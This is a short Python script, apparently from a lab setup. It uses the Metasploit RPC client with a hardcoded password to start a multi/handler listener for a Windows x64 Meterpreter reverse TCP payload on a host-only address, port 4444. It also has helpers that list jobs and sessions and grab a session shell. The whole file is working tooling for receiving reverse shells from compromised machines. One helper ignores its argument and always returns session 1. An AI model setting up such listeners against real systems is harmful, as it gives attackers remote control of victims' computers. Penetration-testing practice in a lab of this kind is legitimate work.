from metasploit.msfrpc import MsfRpcClient, MsfRpcError
import os
import socket
import fcntl
import struct

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

client = MsfRpcClient('mypassword', port=55553) 

def init(port = 4444):
	# addr = get_ip_address('eth0') On docker it's easier to put in by hand
	addr = '192.168.56.1'
	print addr

	exploit = client.modules.use('exploit', 'multi/handler')
	pl = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
	pl['LPORT'] = port
	pl['LHOST'] = addr

	exploit.execute(payload=pl)

def get_sessions():
	try:
		return client.sessions.list
	except MsfRpcError:
		print 'hello world'




def get_session_shell(index):
	return client.sessions.session(1)


def get_jobs():
	return client.jobs.list

